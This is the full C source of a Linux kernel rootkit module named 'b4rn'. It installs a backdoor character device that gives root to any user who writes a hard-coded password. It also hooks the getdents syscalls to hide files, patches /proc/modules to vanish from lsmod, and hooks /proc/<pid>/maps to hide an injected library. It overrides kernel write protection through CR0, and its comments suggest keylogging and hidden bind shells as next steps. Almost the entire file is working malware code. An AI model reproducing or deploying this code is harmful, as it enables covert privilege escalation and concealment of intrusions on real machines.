#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/types.h>
#include <asm/special_insns.h>
#include <asm/tlbflush.h>

/* 
 * [DONE] Hook an existing proc/dev file to give us 
 *   a backdoor (give current user root) 
 * [DONE] Hide that /dev file (getdent)
 * [DONE] Hide us from /proc/modules (and thus lsmod)
 * [DONE] Hide lib from file system (getdent)
 * [DONE] Hide .ko file from filesystem (getdent) 
 * [DONE] Hide libtest from /proc/<PID>/maps
 *
 * Other things we could do here:
 *   - informational prints
 *   - interactive (only do attacks when we receive a command on char dev)
 *   - keylogging
 *   - hide specific processes (from ps output, /proc/<PID>)
 *   - hide network sockets (e.g. a bind shell)
 *   - trigger further code injection
 */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("s00butai");
MODULE_DESCRIPTION("This is not a rootkit.");
MODULE_VERSION("0.1");

extern unsigned long loops_per_jiffy;
static unsigned long * syscall_table;
static unsigned long * seq_show_addr;
static int (*fixed_set_memory_rw)(unsigned long, int);
static int (*fixed_set_memory_ro)(unsigned long, int);
static struct file_operations* proc_modules_operations;
static int (*old_seq_show)(struct seq_file *seq, void *v);

#define GETDENTS_SYSCALL_NUM   __NR_getdents
#define GETDENTS64_SYSCALL_NUM __NR_getdents64
#define CR0_WP (1u << 16)

#define HIDE_PREFIX     "libtest.so.1.0"
#define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
#define MODULE_NAME     "b4rn"
#define MODULE_NAME_SZ  (sizeof(MODULE_NAME)-1)

#define BACKDOOR_PASSWORD "JOSHUA"

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[];
 };

struct linux_dirent64 {
	unsigned long long d_ino;    /* 64-bit inode number */
	long long          d_off;    /* 64-bit offset to next structure */
	unsigned short     d_reclen; /* Size of this dirent */
	unsigned char      d_type;   /* File type */
	char               d_name[];
 };

static int old_uid;
static int old_gid;
static int old_euid;
static int old_egid;


// write handler for our /dev/b4rn file
// if the user provides the password JOSHUA, they elevate to root
static ssize_t
barn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
{
	struct cred * new;
	char * kbuf = kmalloc(count, GFP_KERNEL);
	memset(kbuf, 0, count);
	copy_from_user(kbuf, buf, count);
		
	// the core of our backdoor
	if (strncmp(kbuf, BACKDOOR_PASSWORD, sizeof(BACKDOOR_PASSWORD)-1) == 0) {
		new = prepare_creds();
		if (new != NULL) {
			old_uid = new->uid.val;
			old_gid = new->gid.val;
			old_euid = new->euid.val;
			old_egid = new->egid.val;
			new->uid.val = new->gid.val = 0;
			new->euid.val = new->egid.val = 0;
		}
		commit_creds(new);
	}
		
	return count;
}
	

// NOP: reads on /dev/b4rn don't return anything
static ssize_t
barn_read (struct file * file, char * buf, size_t count, loff_t *ppos)
{
	return count;
}

// boilerplate for /dev files
static const struct file_operations barnops = {
	.owner = THIS_MODULE,
	.read = barn_read,
	.write = barn_write
};


// will appear on /dev/b4rn as a r/w misc char device. 
// The mode sets the perms to be 0666
static struct miscdevice barn_dev = {
	.minor = MISC_DYNAMIC_MINOR, 
	.name = "b4rn", 
	.fops = &barnops,
	.mode = S_IFCHR | S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH,
};

// function type for the getdents handler function
typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
// the original handler
sys_getdents_t sys_getdents_orig = NULL;

typedef asmlinkage long (*sys_getdents64_t)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
// the original handler
sys_getdents64_t sys_getdents64_orig = NULL;


typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
// the original read handler
proc_modules_read_t proc_modules_read_orig = NULL;


static inline void
tlb_flush_hard (void)
{
	write_cr3(virt_to_phys(current->mm->pgd));
	__flush_tlb_all();
}


static inline void
unprotect_page (unsigned long addr)
{
	write_cr0(read_cr0() & (~CR0_WP));
	fixed_set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
	tlb_flush_hard();
}


static inline void
protect_page (unsigned long addr)
{
	write_cr0(read_cr0() | CR0_WP);
	fixed_set_memory_ro(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
	tlb_flush_hard();
}


// our new /proc/modules read handler
static ssize_t 
proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *offset) 
{
	char * kbuf        = NULL;
	char* bad_line     = NULL;
	char* bad_line_end = NULL;
	ssize_t ret        = proc_modules_read_orig(f, buf, len, offset);

	// search in the buf for MODULE_NAME, and remove that line
	kbuf = kmalloc(ret, GFP_KERNEL);
	memset(kbuf, 0, ret);
	copy_from_user(kbuf, buf, ret);
	bad_line = strnstr(kbuf, MODULE_NAME, ret);

	if (bad_line) {
		// find the end of the line
		for (bad_line_end = bad_line; bad_line_end < (kbuf + ret); bad_line_end++) {
			if (*bad_line_end == '\n') {
				bad_line_end++; // go past the line end, so we remove that too
				break;
			}
		}

		// copy over the bad line
		memcpy(bad_line, bad_line_end, (kbuf+ret) - bad_line_end);
		// adjust the size of the return value
		ret -= (ssize_t)(bad_line_end - bad_line);
	}

	copy_to_user(buf, kbuf, ret);
	kfree(kbuf);
	return ret;
}


// TODO: fix this up
static asmlinkage long 
sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) 
{
	int boff;
	char * dbuf;
	struct linux_dirent __user * ent;

	long ret = sys_getdents_orig(fd, dirent, count);

	if (ret <= 0) {
		return ret;
	}

	dbuf = kmalloc(ret, GFP_KERNEL);
	memset(dbuf, 0, ret);
	copy_from_user(dbuf, dirent, ret);
	
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);

		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) ||  // if it has the hide prefix
				strstr(ent->d_name, MODULE_NAME) != NULL) {     // or if it has the module name anywhere in it
			size_t reclen = ent->d_reclen;
			// remove this entry by copying everything after it forward
			memcpy(dbuf + boff, dbuf + boff + reclen, ret - (boff + reclen));
			// and adjust the length reported
			ret -= reclen;
		} else {
			// on to the next entry
			boff += ent->d_reclen;
		}
	}

	copy_to_user(dirent, dbuf, ret);
	kfree(dbuf);

	return ret;
}


static asmlinkage long 
sys_getdents64_new (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) 
{
	int boff;
	struct linux_dirent64 __user * ent;
	char * dbuf;
	long ret = sys_getdents64_orig(fd, dirent, count);

	if (ret <= 0) {
		return ret;
	}
	
	dbuf = kmalloc(ret, GFP_KERNEL);
	memset(dbuf, 0, ret);
	copy_from_user(dbuf, dirent, ret);

	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent64*)(dbuf + boff);

		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
				|| (strstr(ent->d_name, MODULE_NAME)  != NULL)) {     // or if it has the module name anywhere in it
			size_t reclen = ent->d_reclen;
			// and adjust the length reported
			// remove this entry by copying everything after it forward
			memcpy(dbuf + boff, dbuf + boff + reclen, ret - (boff + reclen));
			ret -= reclen;
		} else {
			// on to the next entry
			boff += ent->d_reclen;
		}
	}

	copy_to_user(dirent, dbuf, ret);
	kfree(dbuf);
	return ret;
}


static unsigned long * 
find_syscall_table (void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    unsigned long ret = kallsyms_lookup_name("syscall_table");
    return (unsigned long*)ret;
#else 
    unsigned long ptr;
    unsigned long *p;
    for (ptr = (unsigned long) sys_close;
            ptr < (unsigned long) &loops_per_jiffy;
            ptr += sizeof(void*)) {
        p = (unsigned long *)ptr;
        if (p[__NR_close] == (unsigned long) sys_close) {
            return (unsigned long*)p;
        }
    }
    printk(KERN_ERR "syscall table not found");
    return NULL;
#endif
}


static int
init_overrides (void)
{
    fixed_set_memory_rw = (void*)kallsyms_lookup_name("set_memory_rw");

    if (!fixed_set_memory_rw) {
        printk(KERN_ERR "Unable to find set_memory_rw\n");
        return -1;
    }

    fixed_set_memory_ro = (void*)kallsyms_lookup_name("set_memory_ro");
    if (!fixed_set_memory_ro) {
        printk(KERN_ERR "Unable to find set_memory_ro\n");
        return -1;
    }

    return 0;
}


static int
init_syscall_tab (void)
{
    syscall_table = (unsigned long*)find_syscall_table();

    // record the original getdents handler
	sys_getdents_orig   = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
	sys_getdents64_orig = (sys_getdents64_t)((void**)syscall_table)[GETDENTS64_SYSCALL_NUM];

	unprotect_page((unsigned long)syscall_table);

    syscall_table[GETDENTS_SYSCALL_NUM]   = (unsigned long)sys_getdents_new;
    syscall_table[GETDENTS64_SYSCALL_NUM] = (unsigned long)sys_getdents64_new;

	protect_page((unsigned long)syscall_table);

	return 0;
}


static int
init_proc_mods (void)
{
    proc_modules_operations = (struct file_operations*)kallsyms_lookup_name("proc_modules_operations");
    if (!proc_modules_operations) {
        printk(KERN_ERR "Unable to find module operations address\n");
        return -1;
    }

	proc_modules_read_orig = proc_modules_operations->read;

	unprotect_page((unsigned long)proc_modules_operations);
    proc_modules_operations->read = proc_modules_read_new;
	protect_page((unsigned long)proc_modules_operations);

    return 0;
}


static int
hide_seq_show (struct seq_file * seq, void * v)
{
	int ret, prev_len, this_len;

	prev_len = seq->count;
	ret      = old_seq_show(seq, v);
	this_len = seq->count - prev_len;

	if (strnstr(seq->buf + prev_len, HIDE_PREFIX, this_len))
		seq->count -= this_len;

	return ret;
}
	

static void *
hook_pid_maps_seq_show (const char * path)
{
	void * ret;
	struct file * filep;
	struct seq_file * seq;
	
	if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
		return NULL;

	seq = (struct seq_file*)filep->private_data;

	ret = seq->op->show;

	old_seq_show = seq->op->show;

	seq_show_addr = (unsigned long*)&seq->op->show;

	unprotect_page((unsigned long)seq_show_addr);
	*seq_show_addr = (unsigned long)hide_seq_show;
	protect_page((unsigned long)seq_show_addr);

	filp_close(filep, 0);
	return ret;
}


static int
init_proc_maps (void)
{
	void * old_show = NULL;

	old_show = hook_pid_maps_seq_show("/proc/self/maps");

	if (!old_show) {
		printk(KERN_ERR "Could not find old show routine\n");
		return -1;
	}
	printk(KERN_INFO "Found routine at @%p\n", old_show);
	
	return 0;
}


static __init int
rootkit_init (void)
{
    int ret;

	ret = misc_register(&barn_dev);

	if (ret) {
		printk(KERN_ERR "Could not register char device\n");
		return -1;
	}

	// gives us functions to modify memory
	// that the kernel *really* wants to be read-only
    if (init_overrides()) {
        printk(KERN_ERR "Could not init syscall overriding tools\n");
        return -1;
    }

	// hooks /proc/modules (and thus output of lsmod)
    if (init_proc_mods()) {
        printk(KERN_ERR "Could not init /proc/modules cloaking\n");
        return -1;
    }

	// hooks /proc/<pid>/maps 
	if (init_proc_maps()) {
		printk(KERN_ERR "Could not init /proc/maps cloaking\n");
		return -1;
	}

	// hooks the syscalls for getdents*
	// allowing us to hide files from directory listings (ls, find, etc)
	if (init_syscall_tab()) {
		printk(KERN_ERR "Could not init syscall hooks\n");
		return -1;
	}
	
    return 0;
}


static void
deinit_syscall_tab (void)
{
	unprotect_page((unsigned long) syscall_table);
	syscall_table[GETDENTS_SYSCALL_NUM] = (unsigned long)sys_getdents_orig;
	syscall_table[GETDENTS64_SYSCALL_NUM] = (unsigned long)sys_getdents64_orig;
	protect_page((unsigned long)syscall_table);
}


static void
deinit_proc_mods (void)
{
	unprotect_page((unsigned long)proc_modules_operations);
	proc_modules_operations->read = proc_modules_read_orig;
	protect_page((unsigned long)proc_modules_operations);
}


static void
deinit_proc_maps (void)
{
	unprotect_page((unsigned long)seq_show_addr);
	*seq_show_addr = (unsigned long)old_seq_show;
	protect_page((unsigned long)seq_show_addr);
}


static __exit void
rootkit_deinit (void)
{
	deinit_syscall_tab();
	deinit_proc_maps();
	deinit_proc_mods();
	misc_deregister(&barn_dev);
}


module_init(rootkit_init);
module_exit(rootkit_deinit);
